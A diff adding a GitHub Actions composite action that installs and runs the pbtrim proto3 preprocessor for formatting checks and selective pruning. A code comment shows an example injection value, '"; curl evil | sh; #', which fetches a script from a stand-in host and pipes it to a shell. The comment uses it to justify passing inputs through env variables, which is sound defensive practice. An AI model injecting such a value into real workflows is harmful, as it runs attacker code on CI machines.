@@ -1,0 +1,125 @@
+name: pbpp (pbtrim)
+description: >-
+  Run the pbtrim proto3 preprocessor in CI: check formatting, or
+  materialize a selection-driven prune of a proto tree.
+author: wisdgod
+branding:
+  icon: scissors
+  color: purple
+
+inputs:
+  command:
+    description: "One of: fmt-check, fmt, select, prune."
+    required: false
+    default: fmt-check
+  root:
+    description: "Proto root directory (select/prune)."
+    required: false
+    default: ""
+  rules:
+    description: "Selector rules file (select/prune)."
+    required: false
+    default: ""
+  out:
+    description: "Output directory (prune)."
+    required: false
+    default: ""
+  paths:
+    description: >-
+      Newline-separated files to check for fmt-check/fmt. Empty means
+      every tracked `.proto`. Paths must not contain newlines.
+    required: false
+    default: ""
+  version:
+    description: >-
+      pbpp version to install from crates.io. Empty builds pbtrim from
+      this action's checked-out source instead.
+    required: false
+    default: ""
+
+# Inputs are passed through `env:` and read as shell variables, never
+# interpolated into the script body: `${{ }}` substitution happens before
+# bash sees the text, so an input like `"; curl evil | sh; #` would
+# otherwise execute.
+runs:
+  using: composite
+  steps:
+    - name: Install pbtrim
+      shell: bash
+      env:
+        PBPP_VERSION: ${{ inputs.version }}
+        PBPP_ACTION_PATH: ${{ github.action_path }}
+      run: |
+        set -euo pipefail
+        if ! command -v cargo >/dev/null 2>&1; then
+          echo "::error::cargo not found; add a Rust toolchain step before this action"
+          exit 2
+        fi
+        if [ -n "$PBPP_VERSION" ]; then
+          cargo install pbpp --version "$PBPP_VERSION" --locked
+        else
+          cargo install --path "$PBPP_ACTION_PATH" --locked
+        fi
+
+    - name: Run pbtrim
+      shell: bash
+      env:
+        PBPP_COMMAND: ${{ inputs.command }}
+        PBPP_ROOT: ${{ inputs.root }}
+        PBPP_RULES: ${{ inputs.rules }}
+        PBPP_OUT: ${{ inputs.out }}
+        PBPP_PATHS: ${{ inputs.paths }}
+      run: |
+        set -euo pipefail
+
+        # Reads into an array without GNU-only xargs flags or `mapfile -d`,
+        # so this works on the bash 3.2 macOS runners ship and on Git Bash.
+        collect_protos() {
+          protos=()
+          if [ -n "$PBPP_PATHS" ]; then
+            while IFS= read -r line; do
+              line=${line%$'\r'} # tolerate CRLF input
+              if [ -n "$line" ]; then
+                protos+=("$line")
+              fi
+            done <<< "$PBPP_PATHS"
+          else
+            while IFS= read -r -d '' f; do
+              protos+=("$f")
+            done < <(git ls-files -z -- '*.proto')
+          fi
+        }
+
+        case "$PBPP_COMMAND" in
+          fmt-check | fmt)
+            collect_protos
+            if [ "${#protos[@]}" -eq 0 ]; then
+              echo "no tracked .proto files; nothing to do"
+              exit 0
+            fi
+            # `--` so a file named like a flag is still treated as a file.
+            if [ "$PBPP_COMMAND" = fmt-check ]; then
+              pbtrim fmt --check -- "${protos[@]}"
+            else
+              pbtrim fmt -- "${protos[@]}"
+            fi
+            ;;
+          select)
+            if [ -z "$PBPP_RULES" ] || [ -z "$PBPP_ROOT" ]; then
+              echo "::error::select requires 'rules' and 'root'"
+              exit 2
+            fi
+            pbtrim select --rules "$PBPP_RULES" --root "$PBPP_ROOT"
+            ;;
+          prune)
+            if [ -z "$PBPP_RULES" ] || [ -z "$PBPP_ROOT" ] || [ -z "$PBPP_OUT" ]; then
+              echo "::error::prune requires 'rules', 'root', and 'out'"
+              exit 2
+            fi
+            pbtrim prune --rules "$PBPP_RULES" --root "$PBPP_ROOT" --out "$PBPP_OUT"
+            ;;
+          *)
+            echo "::error::unknown command '$PBPP_COMMAND' (fmt-check|fmt|select|prune)"
+            exit 2
+            ;;
+        esac
